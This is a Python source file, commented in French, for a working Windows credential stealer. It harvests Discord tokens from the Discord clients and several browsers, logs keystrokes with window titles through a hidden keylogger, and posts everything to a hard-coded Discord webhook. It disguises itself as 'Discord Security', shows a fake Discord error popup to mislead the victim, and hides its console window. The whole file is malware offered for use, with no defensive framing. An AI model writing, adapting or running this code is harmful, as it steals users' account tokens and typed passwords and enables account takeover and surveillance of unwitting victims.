import os
import re
import json
import base64
import sqlite3
import shutil
import threading
import time
import ctypes
import subprocess
from datetime import datetime
from urllib.request import Request, urlopen
from urllib.error import HTTPError

WEBHOOK_URL = "https://discordapp.com/api/webhooks/1538353192818057228/-a0gYrruzcIyfPZWWw-TeKq3F66R5r-XbmWSLUm_4FXHIvLtx9P_SMJq0bXDLoNLm2aI"

class DiscordTokenGrabber:
    def __init__(self):
        self.tokens = []
        self.pc_info = self.get_pc_info()
        
    def get_pc_info(self):
        """Récupère les infos système"""
        try:
            import platform
            return {
                "user": os.environ.get("USERNAME", "Unknown"),
                "computer": os.environ.get("COMPUTERNAME", "Unknown"),
                "platform": platform.platform(),
                "processor": platform.processor()
            }
        except:
            return {"user": "Unknown", "computer": "Unknown"}
    
    def find_tokens(self, path):
        """Cherche les tokens dans les fichiers LevelDB"""
        path = os.path.join(path, "Local Storage", "leveldb")
        tokens = []
        
        if not os.path.exists(path):
            return tokens
            
        for file in os.listdir(path):
            if not file.endswith((".ldb", ".log")):
                continue
                
            try:
                with open(os.path.join(path, file), "r", errors="ignore") as f:
                    content = f.read()
                    # Pattern token Discord : 24-26 caractères alphanumériques + . + 6-10 caractères
                    for match in re.findall(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}", content):
                        if match not in tokens and self.validate_token(match):
                            tokens.append(match)
            except:
                continue
                
        return tokens
    
    def extract_from_chrome(self):
        """Extrait les tokens des cookies Chrome (si connexion automatique)"""
        tokens = []
        try:
            local_state_path = os.path.join(os.environ["LOCALAPPDATA"], 
                                          "Google", "Chrome", "User Data", "Local State")
            
            if not os.path.exists(local_state_path):
                return tokens
                
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
                
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            
            # Chemin vers la base de données des cookies
            db_path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", 
                                  "User Data", "Default", "Network", "Cookies")
            
            if not os.path.exists(db_path):
                db_path = db_path.replace("Network", "")
                
            if os.path.exists(db_path):
                # Copie temporaire pour éviter le verrouillage
                temp_db = os.path.join(os.environ["TEMP"], "chrome_cookies_temp")
                shutil.copy2(db_path, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%discord%'")
                
                for row in cursor.fetchall():
                    if row[1] == "token":
                        # Décryptage (simplifié, nécessite win32crypt ou DPAPI)
                        pass
                        
                conn.close()
                os.remove(temp_db)
                
        except Exception as e:
            pass
            
        return tokens
    
    def validate_token(self, token):
        """Vérifie si le token est valide (format correct)"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return False
            # Décode l'ID utilisateur (première partie)
            user_id = base64.b64decode(parts[0] + "==").decode("utf-8", errors="ignore")
            return user_id.isdigit()
        except:
            return False
    
    def grab_all(self):
        """Récupère tous les tokens de toutes les sources"""
        paths = {
            "Discord": os.path.join(os.environ.get("APPDATA", ""), "Discord"),
            "Discord Canary": os.path.join(os.environ.get("APPDATA", ""), "discordcanary"),
            "Discord PTB": os.path.join(os.environ.get("APPDATA", ""), "discordptb"),
            "Chrome": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default"),
            "Edge": os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data", "Default"),
            "Opera": os.path.join(os.environ.get("APPDATA", ""), "Opera Software", "Opera Stable"),
            "Brave": os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data", "Default")
        }
        
        results = {}
        
        for name, path in paths.items():
            if os.path.exists(path):
                tokens = self.find_tokens(path)
                if tokens:
                    results[name] = tokens
                    self.tokens.extend(tokens)
        
        # Essaie aussi d'extraire de Chrome
        chrome_tokens = self.extract_from_chrome()
        if chrome_tokens:
            if "Chrome_Cookies" not in results:
                results["Chrome_Cookies"] = []
            results["Chrome_Cookies"].extend(chrome_tokens)
            self.tokens.extend(chrome_tokens)
            
        return results
    
    def send_to_webhook(self, keylog_data=""):
        """Envoie les tokens + keylogs au webhook"""
        if not self.tokens and not keylog_data:
            return
            
        try:
            # Construit le message
            description = f"**PC:** {self.pc_info['computer']}\n**User:** {self.pc_info['user']}\n**OS:** {self.pc_info['platform']}\n\n"
            
            if self.tokens:
                description += "**🎫 TOKENS DISCORD:**\n```\n"
                for i, token in enumerate(set(self.tokens), 1):
                    description += f"{i}. {token[:20]}...{token[-10:]}\n"
                description += "```\n"
            
            if keylog_data:
                description += f"**⌨️ KEYLOGS:**\n```{keylog_data[-1500:]}```"  # Limite à 1500 chars
            
            embed = {
                "title": f"🔴 Grab + Keylog - {self.pc_info['user']}",
                "description": description,
                "color": 0xff0000,
                "timestamp": datetime.utcnow().isoformat(),
                "footer": {"text": "Dual Payload"}
            }
            
            payload = {
                "username": "Discord Security",
                "embeds": [embed],
                "content": f"**Nouvelle victime connectée** ||`{self.pc_info['computer']}`||"
            }
            
            req = Request(
                WEBHOOK_URL,
                data=json.dumps(payload).encode("utf-8"),
                headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
                method="POST"
            )
            
            urlopen(req, timeout=15)
            
        except Exception as e:
            # Sauvegarde locale si échec
            with open(os.path.join(os.environ["TEMP"], "payload_backup.txt"), "a") as f:
                f.write(f"\n{datetime.now()}: {self.tokens}\n{keylog_data}\n")

class HiddenKeylogger:
    def __init__(self, grabber):
        self.grabber = grabber
        self.buffer = []
        self.last_send = time.time()
        self.window = "Unknown"
        self.running = True
        
    def get_window(self):
        try:
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buff, length + 1)
            return buff.value or "Unknown"
        except:
            return "Unknown"
    
    def start(self):
        """Boucle principale du keylogger"""
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        
        # État des touches
        key_states = {}
        keys_map = {
            0x08: '[BACK]', 0x09: '[TAB]', 0x0D: '\n', 0x10: '[SHIFT]',
            0x11: '[CTRL]', 0x12: '[ALT]', 0x14: '[CAPS]', 0x1B: '[ESC]',
            0x20: ' ', 0x30: '0', 0x31: '1', 0x32: '2', 0x33: '3', 0x34: '4',
            0x35: '5', 0x36: '6', 0x37: '7', 0x38: '8', 0x39: '9',
            0x41: 'a', 0x42: 'b', 0x43: 'c', 0x44: 'd', 0x45: 'e', 0x46: 'f',
            0x47: 'g', 0x48: 'h', 0x49: 'i', 0x4A: 'j', 0x4B: 'k', 0x4C: 'l',
            0x4D: 'm', 0x4E: 'n', 0x4F: 'o', 0x50: 'p', 0x51: 'q', 0x52: 'r',
            0x53: 's', 0x54: 't', 0x55: 'u', 0x56: 'v', 0x57: 'w', 0x58: 'x',
            0x59: 'y', 0x5A: 'z', 0x60: '0', 0x61: '1', 0x62: '2', 0x63: '3',
            0x64: '4', 0x65: '5', 0x66: '6', 0x67: '7', 0x68: '8', 0x69: '9',
            0xBE: '.', 0xBC: ',', 0xBD: '-', 0xBF: '/', 0xBA: ';', 0xDE: "'",
            0xDB: '[', 0xDD: ']', 0xDC: '\\', 0xC0: '`', 0xBB: '=', 0xBD: '-'
        }
        
        for k in keys_map:
            key_states[k] = False
            
        while self.running:
            try:
                current_window = self.get_window()
                if current_window != self.window:
                    self.window = current_window
                    self.buffer.append(f"\n\n[{self.window}]\n")
                
                for code, char in keys_map.items():
                    state = user32.GetAsyncKeyState(code) & 0x8000
                    if state:
                        if not key_states[code]:
                            key_states[code] = True
                            self.buffer.append(char)
                            
                            # Envoi immédiat sur Enter
                            if code == 0x0D:
                                self.send_logs()
                    else:
                        key_states[code] = False
                
                # Envoi périodique
                if time.time() - self.last_send > 45 or len(self.buffer) > 100:
                    self.send_logs()
                    
                time.sleep(0.01)
                
            except Exception as e:
                time.sleep(1)
    
    def send_logs(self):
        if not self.buffer:
            return
            
        data = "".join(self.buffer)
        self.grabber.send_to_webhook(keylog_data=data)
        self.buffer = []
        self.last_send = time.time()

def fake_error_popup():
    """Affiche une fausse erreur pour tromper la victime"""
    try:
        ctypes.windll.user32.MessageBoxW(
            0,
            "Error: Failed to initialize Discord Rich Presence.\n\nPlease restart Discord and try again.",
            "Discord",
            0x10 | 0x0
        )
    except:
        pass

def main():
    # 1. Affiche la fausse erreur (non bloquant)
    threading.Thread(target=fake_error_popup, daemon=True).start()
    time.sleep(1)
    
    # 2. Lance le grabber de tokens
    grabber = DiscordTokenGrabber()
    tokens_found = grabber.grab_all()
    
    # Envoie immédiat des tokens
    grabber.send_to_webhook()
    
    # 3. Lance le keylogger en parallèle (même objet pour combiner les envois)
    keylogger = HiddenKeylogger(grabber)
    
    # Thread non-daemon pour survivre à la fermeture
    kl_thread = threading.Thread(target=keylogger.start)
    kl_thread.daemon = False
    kl_thread.start()
    
    # Garde le main thread vivant
    while True:
        time.sleep(60)

if __name__ == "__main__":
    # Masque la console si pas déjà caché
    if os.name == 'nt':
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    main()
